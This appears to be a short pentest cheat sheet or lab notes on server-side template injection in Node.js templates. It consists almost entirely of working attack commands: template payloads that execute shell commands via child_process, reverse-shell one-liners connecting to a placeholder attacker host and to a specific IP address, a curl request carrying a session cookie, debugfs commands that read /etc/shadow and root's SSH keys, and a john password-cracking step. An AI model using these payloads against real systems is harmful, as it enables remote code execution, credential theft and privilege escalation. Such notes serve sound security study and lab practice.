# Server Side Template Injection (SSTI)
Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.


```bash
<%= 7*7 %>
# rendered RCE javascript
<%=global.process.mainModule.require("child_process").execSync("id").toString()%>

<%=global.process.mainModule.require("child_process").execSync('bash -c "bash -i >& /dev/tcp/attacker_ip/333 0>&1"').toString()%>
```

```bash
curl -v -i -X POST http://10.65.169.163/staff/preview \
  -H "Cookie: connect.sid=s%3AzMqTgEQJmUJk3_XSkj1qfS3ht_VhVePq.AXV2K0UAZqWnG%2FeHKsuOkeCtAip8Gp177bq5vH3pQiU; Path=/; HttpOnly" \
  --data-urlencode "template=<%= 7*7 %>"
```

```bash
# SSTI
global.process.mainModule.require("child_process").execSync('bash -c "bash -i >& /dev/tcp/192.168.159.218/333 0>&1"').toString() 
# node --inspect
exec process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/192.168.159.218/444 0>&1"').toString()
#id
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
# debugfs
ls -l /dev/sd* /dev/nvme* /dev/mapper/* 2>/dev/null
debugfs -R "cat /etc/shadow" /dev/nvme0n1p1
debugfs -R "ls -l /root/.ssh/" /dev/nvme0n1p1
debugfs -R "cat /root/.ssh/authorized_keys" /dev/nvme0n1p1

# hash root /etc/shadow
john --format=crypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```